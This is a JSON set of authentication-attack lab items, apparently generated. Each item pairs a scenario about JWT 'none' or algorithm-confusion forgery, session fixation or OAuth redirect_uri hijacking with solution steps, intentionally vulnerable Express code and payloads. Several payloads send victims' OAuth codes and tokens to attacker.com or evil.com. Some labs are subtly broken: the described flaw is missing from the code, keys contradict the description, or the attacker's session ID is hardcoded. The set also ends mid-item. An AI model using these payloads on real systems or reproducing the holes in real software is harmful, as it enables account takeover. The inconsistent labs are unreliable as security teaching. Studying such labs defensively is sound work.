[
    {
        "Lab scenario": "JWT algorithm confusion vulnerability in session token verification",
        "Lab Description": "The application's authentication relies on JSON Web Tokens (JWT) for session validation. However, it insecurely trusts the algorithm header provided by the client, allowing an attacker to switch from 'RS256' to 'none' or 'HS256' and forge a valid token without the server's private key. The application signs session tokens with RSA but doesn't enforce algorithm validation. To solve: forge a JWT for the 'carlos' user and access the protected admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Use Burp Suite to intercept a valid JWT after authenticating with your own credentials.",
            "2. Decode the token using jwt.io or Postman, and observe the algorithm field set to 'RS256'.",
            "3. Modify the algorithm to 'none' and remove the signature, or switch it to 'HS256' and sign with the public key as the HMAC key.",
            "4. Send the crafted token in the Authorization header using Postman and attempt to access /admin-dashboard.",
            "5. Verify successful admin access by observing the response for admin-only data or 'Welcome carlos' message."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); jwt.verify(token, publicKey, (err, decoded) => { if (err) return res.sendStatus(403); if (decoded.username === 'carlos') res.send('Welcome carlos'); else res.sendStatus(403); }); }); app.listen(5000, () => console.log('JWT Algorithm Confusion Lab running'));",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
            "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.[HMAC-SHA256-SIGNATURE-using-publicKey]"
        ]
    },
    {
        "Lab scenario": "OAuth implicit flow misconfiguration in third-party login endpoint",
        "Lab Description": "This lab's OAuth 2.0 login flow improperly accepts any token issued by an untrusted Authorization Server without validation. The application does not validate the issuer (`iss`) claim, allowing attackers to craft an access token with 'carlos' as the subject. To solve: craft a forged OAuth token using a dummy authorization server and log in as Carlos.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "1. Use Burp Suite to capture the OAuth login process and inspect the 'access_token' parameter returned from the Authorization Server.",
            "2. Set up a fake OAuth server (such as with oauth-toolkit or mitmproxy) and create a signed JWT with the payload { 'sub': 'carlos' }.",
            "3. Intercept the redirect request using Burp and replace the legitimate access_token with your forged one.",
            "4. Replay the modified request to the target /auth/callback endpoint.",
            "5. Verify successful login as 'carlos' by accessing the /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; const payload = jwt.decode(token); if (payload && payload.sub) { res.send(`Logged in as ${payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.get('/my-account', (req, res) => { res.send('Welcome to your account page!'); }); app.listen(3000, () => console.log('OAuth Implicit Flow Lab running'));",
        "payloads": [
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MifQ.[Valid-Signature-With-Your-Key]",
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
        ]
    },
    {
        "Lab scenario": "Session fixation via predictable session identifier in login endpoint",
        "Lab Description": "The web application creates a session identifier before authentication, and does not issue a new one upon successful login. This allows attackers to predefine a session ID, share it with the victim, and later hijack the session. To solve: Fixate a session, lure the victim into using it, then log in with the same session to access their My Account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "1. Use OWASP ZAP or Burp Suite to capture the session cookie issued before login.",
            "2. Manually set the session cookie to a known fixed value (e.g., SESSIONID=attacker-session).",
            "3. Send the link with the fixed session ID to the victim and ensure they log in without altering the session cookie.",
            "4. Reuse the same SESSIONID value to send an authenticated GET request to /my-account after the victim logs in.",
            "5. Confirm access to the victim's account page by verifying the returned user-specific content."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'supersecurepassword' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies['SESSIONID']; if (session === 'attacker-session') { res.send('Welcome carlos!'); } else { res.send('Not authorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
            "SESSIONID=attacker-session",
            "SESSIONID=known-fixed-session-id"
        ]
    },
    {
        "Lab scenario": "JWT algorithm confusion in session validation",
        "Lab Description": "This lab's authentication relies on JWTs for session validation. The server fails to enforce the algorithm specified in the token header and blindly trusts the signature when 'alg' is set to 'none'. The application fails to verify JWT signatures when the token's header declares 'none' as the algorithm, allowing an attacker to forge tokens. To solve: Forge a valid JWT for the user carlos and access their account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to intercept a login request and capture the JWT token issued for your own account.",
            "Inspect the token using jwt.io and confirm the header uses HS256 and the payload contains your username.",
            "Modify the token's header to use 'alg':'none' and the payload to set the username to 'carlos'. Remove the signature entirely.",
            "Send the forged JWT as a cookie in the Authorization header to /my-account and verify access to Carlos's account.",
            "Access the protected page and confirm the account data belongs to carlos, solving the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const secret = 'supersecretkey'; app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, secret)) { res.send(`Account details for ${decoded.payload.user}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
        "payloads": [
            "Header: {\"alg\":\"none\"}",
            "Payload: {\"user\":\"carlos\"}",
            "Token: base64url(header) + '.' + base64url(payload) + '.'"
        ]
    },
    {
        "Lab scenario": "Session fixation via predictable session IDs",
        "Lab Description": "This lab's session management is vulnerable to fixation. The server issues predictable session IDs that are not regenerated upon successful login. An attacker can set a victim's session identifier before they log in and then reuse it to hijack the session. To solve: Fixate a session for the user carlos, wait for them to authenticate, then reuse the session ID to access their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to intercept the initial unauthenticated GET request to /login and observe the Set-Cookie header containing a session ID.",
            "Send a crafted session ID (e.g., sessionid=attackercrafted123) in the Cookie header when visiting /login and verify the server accepts it.",
            "Entice the victim to log in while using the fixed sessionid=attackercrafted123 via a phishing link or CSRF.",
            "Once logged in, reuse the same sessionid=attackercrafted123 cookie to access /my-account directly.",
            "Confirm successful session takeover by accessing the user data for carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || `sess-${Math.random().toString(36).substr(2, 8)}`; res.cookie('sessionid', sessionId).send('Please log in'); }); app.post('/authenticate', (req, res) => { const { username, password } = req.query; if (users[username] === password) res.send(`Logged in as ${username}`); else res.status(401).send('Invalid login'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionid; if (sessionId === 'attackercrafted123') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
            "Cookie: sessionid=attackercrafted123",
            "Session Fixation Attack: Use same sessionid pre and post-login"
        ]
    },
    {
        "Lab scenario": "OAuth implicit flow misconfiguration",
        "Lab Description": "This lab's authentication relies on OAuth with implicit flow, but the client application fails to validate the 'state' parameter, making it vulnerable to CSRF-based token theft. The attacker can craft an authorization URL to leak the victim's token. To solve: Capture Carlos's OAuth token and use it to access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Burp Suite to analyze the OAuth flow and capture the authorization URL including the state parameter.",
            "Replace the 'state' parameter value with an attacker-controlled redirect URI that points to your malicious server.",
            "Send this manipulated link to the victim and wait for them to authorize the request.",
            "Monitor your server to capture the victimâ€™s access token in the redirected request.",
            "Use Postman to set the Authorization header to 'Bearer {captured-token}' and access /my-account as carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; const token = 'token-carlos-xyz'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-xyz') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:4000'));",
        "payloads": [
            "Authorization URL: /auth?response_type=token&client_id=app123&redirect_uri=http://attacker.com/catch&state=abc123",
            "Authorization: Bearer token-carlos-xyz"
        ]
    },
    {
        "Lab scenario": "JWT Signature Verification Bypass in Token Validation Middleware",
        "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly trusts the 'alg' field from the token header. When this is set to 'none', the application skips signature verification. The application issues JWTs signed with a secret and expects a valid signature. To solve: Forge a valid token for 'carlos' by exploiting the 'none' algorithm bypass and access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a login request using Burp Suite and capture a valid JWT from the Authorization header.",
            "Validate the token structure and identify the 'alg' value in the decoded JWT header using jwt.io.",
            "Craft a new JWT with the 'alg' set to 'none' and the payload containing 'username':'carlos'.",
            "Replace the original token with the crafted unsigned JWT in Burp Repeater and forward the request.",
            "If successful, observe that the account page for 'carlos' loads, confirming the signature bypass."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { try { jwt.verify(token, SECRET_KEY); res.send(`Account details for ${decoded.payload.username}`); } catch { res.status(403).send('Invalid token'); } } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9"
        ]
    },
    {
        "Lab scenario": "OAuth Authorization Code Interception in Redirect Handler",
        "Lab Description": "The application implements OAuth 2.0 for third-party login using a redirect_uri parameter vulnerable to open redirection. An attacker can intercept the authorization code before token exchange. The application trusts user-controlled redirect URLs without validation. To solve: Steal Carlos's authorization code via a manipulated redirect_uri and log into his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Burp Suite to intercept the OAuth flow and modify the redirect_uri to a malicious domain you control.",
            "Use a local listener (like Postman Interceptor or Burp Collaborator) to capture the authorization code when the victim authenticates.",
            "Manually exchange the intercepted authorization code for an access token using Postman or curl.",
            "Use the obtained token to make an authenticated request to /my-account as Carlos.",
            "Verify the successful compromise by accessing Carlos's profile data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'supersecrettoken' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running on http://localhost:4000'));",
        "payloads": [
            "https://attacker.com/callback?code=authcode123",
            "https://malicious-site.io/callback?code=authcode123"
        ]
    },
    {
        "Lab scenario": "Session Fixation via Insecure Cookie Assignment in Login Flow",
        "Lab Description": "The application improperly assigns the session identifier before user authentication, allowing attackers to fixate a known session ID. The server does not regenerate the session token post-login. To solve: Fixate a session ID before login and trick Carlos into logging in, then reuse the same session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Burp Suite to intercept the initial GET /login request and observe the Set-Cookie response with session ID.",
            "Send the fixed session ID to the victim via social engineering and wait for them to log in.",
            "Once the victim logs in, reuse the same fixed session cookie in Burp Repeater.",
            "Access the /my-account endpoint while sending the fixed session cookie to hijack the authenticated session.",
            "Confirm access to Carlos's account, demonstrating successful session fixation exploitation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Session initialized'); } else { res.send('Session exists'); } }); const users = { 'carlos': { password: 'qwerty', session: null } }; app.post('/authenticate', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { users[username].session = req.cookies.session; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = Object.keys(users).find(u => users[u].session === req.cookies.session); if (user) res.send(`Account details for ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
            "session=attackerfixedsession",
            "session=knownsessionvalue"
        ]
    },
    {
        "Lab scenario": "JWT signature verification bypass in REST API login",
        "Lab Description": "This lab's RESTful authentication mechanism uses JWTs but fails to verify the token signature correctly when the 'alg' field is manipulated. The application accepts JWTs from clients to grant access to protected resources. However, the backend incorrectly trusts unsigned tokens when the 'alg' is set to 'none'. To solve: craft and submit a forged token to access Carlos's protected account endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture a valid JWT token using Burp Suite by logging into your own account and intercepting the Authorization header.",
            "Inspect the JWT token in jwt.io and observe the 'alg' header, which is likely set to HS256.",
            "Modify the JWT header to set 'alg' to 'none' and remove the signature part of the token.",
            "Modify the payload section to change the username to 'carlos' and re-encode the JWT.",
            "Resend the forged token using Burp Repeater in the Authorization header and confirm the server grants access to Carlos's /my-account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'password123' }; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "{\"alg\":\"none\"}",
            "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
            "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
        ]
    },
    {
        "Lab scenario": "Session fixation via predictable session tokens in login flow",
        "Lab Description": "This web application's login process is vulnerable to session fixation. The server fails to regenerate session tokens upon successful login, allowing an attacker to set a valid session ID in advance and hijack a victim's authenticated session. To solve: pre-set a session ID before login, then log in as Carlos using that fixed session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Using Burp Suite, intercept the GET /login page request and note the Set-Cookie response containing the session ID.",
            "Modify the session cookie to a chosen predictable value, such as 'fixed-session-id', using Burp Repeater or browser dev tools.",
            "Send the fixed session ID to Carlos via social engineering or session injection (simulated for the lab).",
            "Log in as Carlos using his known credentials while maintaining the fixed session ID.",
            "After login, navigate to /my-account to confirm access using the pre-set session token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { carlos: 'letmein' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixed-session-id') { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "Cookie: sessionid=fixed-session-id",
            "POST /login with pre-set Cookie: sessionid=fixed-session-id",
            "Use same sessionid to access /my-account"
        ]
    },
    {
        "Lab scenario": "OAuth misconfiguration leaking authorization code via redirect URI manipulation",
        "Lab Description": "This lab's OAuth 2.0 implementation misconfigures the allowed redirect URIs, failing to validate the domain properly. Attackers can manipulate the redirect URI to capture the authorization code for any user. To solve: hijack Carlos's authorization code and use it to obtain an access token and access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Using OWASP ZAP or Burp Suite, initiate an OAuth login flow and observe the redirect_uri parameter in the authorization URL.",
            "Modify the redirect_uri to an attacker-controlled domain using an open redirect service like https://evil.com/path.",
            "Send the modified URL to Carlos (simulated) and wait for him to authenticate and be redirected to your server capturing the authorization code.",
            "Exchange the captured authorization code for an access token via POST /oauth/token using Postman.",
            "Use the obtained access token in the Authorization header to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { const token = `token-${authCodes[code]}`; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; if (tokens[token]) { res.send(`Account details for ${tokens[token]}`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "https://vulnerable.com/authorize?client_id=xyz&redirect_uri=https://evil.com/path&state=abc",
            "POST /oauth/token with code=<captured_code>",
            "Authorization: Bearer token-carlos"
        ]
    },
    {
        "Lab scenario": "JWT token signature vulnerability in session management",
        "Lab Description": "This lab's session management mechanism uses JSON Web Tokens (JWT) for authentication but fails to securely verify the token's signature. The application uses a hardcoded secret and doesn't validate the algorithm properly. To solve: forge a valid admin token using the known public key and access the admin control panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Burp Suite to intercept and decode the JWT token after authenticating with a user account.",
            "Validate if the token's 'alg' header can be modified by setting it to 'none' or 'HS256' without verification failures.",
            "Craft a custom JWT token with 'alg' set to 'HS256' and use 'admin' as the username, signing it using the discovered or null secret.",
            "Resend the forged token as a cookie using Burp Repeater to access the /admin page.",
            "Verify successful exploitation by observing the 'Admin Control Panel' interface."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET_KEY = 'insecuresecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
        "payloads": [
            "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: HMAC(HS256, 'insecuresecret')",
            "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: ''"
        ]
    },
    {
        "Lab scenario": "OAuth implicit grant misconfiguration in login flow",
        "Lab Description": "This lab simulates an OAuth-based login mechanism that incorrectly trusts user-supplied redirect URIs and fails to validate tokens properly. The application exposes the access token directly in the URL hash, allowing attackers to manipulate it. To solve: hijack an OAuth token using a crafted redirect URI and access the victim's protected resources.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to passively scan the OAuth flow during login and extract the authorization URL.",
            "Modify the redirect_uri parameter to an attacker-controlled domain and observe token leakage via URL fragments.",
            "Construct a malicious OAuth authorization request that uses the manipulated redirect_uri.",
            "Capture the leaked token using a listener on the attacker's server (e.g., with netcat or Burp Collaborator).",
            "Replay the stolen token to the /account endpoint and confirm ownership of the victim's session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = { 'carlos': { accessToken: 'abc123token' } }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = users['carlos'].accessToken; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const { token } = req.query; if (token === users['carlos'].accessToken) { res.send('Welcome, carlos!'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
        "payloads": [
            "https://victim-site.com/auth?redirect_uri=https://attacker.com/capture",
            "https://attacker.com/#access_token=abc123token"
        ]
    },
    {
        "Lab scenario": "Session fixation attack via URL parameter in login endpoint",
        "Lab Description": "This lab's login endpoint fails to regenerate session tokens after successful authentication, allowing attackers to set their own session ID via a URL parameter. If the session ID remains unchanged after login, attackers can predetermine the victim's session. To solve: fixate your session ID and access Carlos's account after forcing him to log in.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Use Postman to send a GET request to /login?session=attackersessionid and note the session cookie assigned.",
            "Craft a phishing link containing the same session ID and send it to the victim.",
            "Upon victim login, the session remains fixed to 'attackersessionid', allowing hijacking.",
            "Use the same session cookie in your browser or Postman to access the /my-account endpoint.",
            "Verify that the server returns the victim's personalized account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionID = req.query.session || Math.random().toString(36).substr(2); res.cookie('session', sessionID); res.send('Session initialized'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'attackersessionid') { res.send('Welcome carlos!'); } else { res.send('Welcome guest'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
        "payloads": [
            "GET /login?session=attackersessionid",
            "Set-Cookie: session=attackersessionid",
            "GET /my-account with Cookie: session=attackersessionid"
        ]
    },
    {
        "Lab scenario": "JWT Signature None Algorithm Bypass in Authorization Header",
        "Lab Description": "This lab's authentication system uses JSON Web Tokens (JWT) for session management. The server-side JWT verification improperly trusts tokens with the `alg` field set to 'none'. The application signs user sessions, but fails to enforce algorithm validation during token parsing, allowing attackers to forge tokens without knowing the secret key. To solve: Log in as the 'carlos' user by crafting a valid JWT without the signing key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept the JWT token after logging into your own account using Burp Suite.",
            "Validate that the token uses HS256 or RS256 by decoding the header and checking the `alg` field.",
            "Modify the JWT header: set `alg` to `none` and remove the signature part of the token.",
            "Set the `sub` claim in the payload to `carlos` and replace your session cookie in the browser with the forged token.",
            "Visit the /my-account endpoint to confirm successful login as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'RS256', 'none'] }); res.send('Account details for ' + decoded.sub); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ",
            "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
        ]
    },
    {
        "Lab scenario": "Session Fixation via URL Parameter in Login Flow",
        "Lab Description": "This lab's session handling mechanism is vulnerable to fixation attacks. The session ID is accepted from a user-supplied URL parameter (`sessionId`) and assigned without regeneration upon login, enabling attackers to predetermine session IDs for victims. To solve: Log in as Carlos by fixing a session ID before authentication and reuse it post-login to hijack his session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP or Burp Suite to intercept the initial GET /login request and observe the URL sessionId parameter.",
            "Confirm that the server allows setting the session ID via the URL and does not regenerate it after successful login.",
            "Craft a phishing link embedding a predictable `sessionId` value like `/login?sessionId=attackersession123`.",
            "Wait until the victim uses this link and logs in. Then reuse the same `sessionId` in your own browser to access /my-account.",
            "Verify that you now have access to the victim's session as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send(`<form method='POST' action='/login'>Username: <input name='username'/><br>Password: <input name='password'/><br><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecret') res.redirect('/my-account'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies['sessionId']; if (sessionId === 'attackersession123') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "http://victim-app/login?sessionId=attackersession123",
            "sessionId=attackersession123",
            "Cookie: sessionId=attackersession123"
        ]
    },
    {
        "Lab scenario": "OAuth Misconfiguration Token Leakage in Redirect URI",
        "Lab Description": "This lab's OAuth implementation is vulnerable due to overly permissive redirect URI validation. An attacker can manipulate the redirect URI parameter to leak authorization codes to a malicious domain. The OAuth server accepts partial matching on registered redirect URIs, making it possible to inject crafted URLs. To solve: Extract the OAuth token for Carlos and access his account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Burp Suite to intercept the OAuth login flow and inspect the `redirect_uri` parameter.",
            "Modify `redirect_uri` to embed a malicious endpoint using an open redirect or subdomain like `https://attacker.com?code=`.",
            "Login as Carlos and complete the OAuth flow to capture the leaked authorization code in your listener.",
            "Exchange the stolen code for an access token via Postman or curl.",
            "Use the access token to call the /my-account API as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode1234'; if (redirect_uri.startsWith('https://trusted.com')) { const redirect = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirect); } else { res.status(400).send('Invalid redirect URI'); } }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode1234') res.json({ access_token: 'valid_token_for_carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer valid_token_for_carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Token Leak Lab running on http://localhost:${PORT}`));",
        "payloads": [
            "https://attacker.com?code=",
            "https://trusted.com.attacker.com",
            "https://trusted.com%00.attacker.com"
        ]
    },
    {
        "Lab scenario": "Session Fixation via predictable session tokens in login flow",
        "Lab Description": "This lab demonstrates a session fixation vulnerability within the login mechanism. The application assigns session IDs prior to authentication but fails to regenerate them post-login, allowing an attacker to fixate a session. The application uses insecure random generation for the session token which is passed as a cookie. To solve: fixate Carlos's session and access his account by predefining the session ID before he logs in.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
